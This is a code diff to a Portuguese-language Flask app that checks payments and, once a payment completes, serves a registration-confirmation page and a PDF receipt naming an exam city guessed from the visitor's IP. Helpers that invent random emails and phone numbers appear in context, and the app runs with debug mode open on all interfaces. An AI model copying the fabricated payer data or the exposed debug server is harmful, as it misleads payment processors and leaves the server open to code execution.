@@ -1,12 +1,12 @@
-# Imports e configuração básica
 import os
+from datetime import datetime
+from flask_weasyprint import HTML, render_pdf
 import requests
 import logging
 import random
 import gzip
-from datetime import datetime, timedelta
 from typing import Dict, Any, List
-from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify, after_this_request
+from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify
 from flask_caching import Cache
 from flask_sqlalchemy import SQLAlchemy
 from flask_migrate import Migrate
@@ -625,6 +625,10 @@ def check_payment(payment_id):
     try:
         payment_api = create_payment_api()
         status_data = payment_api.check_payment_status(payment_id)
+
+        if status_data['status'] == 'completed':
+            return jsonify({'status': 'completed', 'redirect_url': url_for('inscricao_confirmada')})
+
         return jsonify(status_data)
     except Exception as e:
         logger.error(f"Error checking payment status: {str(e)}")
@@ -742,6 +746,39 @@ def generate_random_email():
 
 def generate_random_phone():
     return f"55119{random.randint(10000000,99999999)}"
+
+@app.route('/inscricao_confirmada')
+def inscricao_confirmada():
+    dados = session.get('dados_taxa')
+    if not dados:
+        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        return redirect(url_for('taxa'))
+
+    return render_template('inscricao_confirmada.html',
+                         dados=dados,
+                         current_year=datetime.now().year)
+
+@app.route('/download_comprovante')
+def download_comprovante():
+    dados = session.get('dados_taxa')
+    if not dados:
+        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        return redirect(url_for('taxa'))
+
+    # Get user's city from IP
+    ip_address = get_client_ip()
+    cidade_prova = get_estado_from_ip(ip_address)
+
+    # Generate PDF
+    html = render_template('comprovante_inscricao.html',
+                         dados=dados,
+                         cidade_prova=cidade_prova,
+                         current_date=datetime.now().strftime('%d/%m/%Y'),
+                         current_time=datetime.now().strftime('%H:%M:%S'))
+
+    return render_pdf(HTML(string=html))
+
+from datetime import timedelta
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
